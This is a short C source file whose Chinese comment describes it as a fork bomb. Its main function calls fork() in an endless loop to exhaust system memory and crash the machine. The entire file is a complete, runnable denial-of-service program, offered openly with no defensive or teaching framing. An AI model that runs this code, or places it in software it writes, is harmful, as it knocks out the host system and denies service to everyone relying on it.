#include <stdio.h>
#include <unistd.h>

/*
fork炸弹，不断运行fork以消耗系统内存空间，使系统内存耗尽死机
*/

int main()
{
  while(1)
  {
    fork();
  }
  return 0;
}
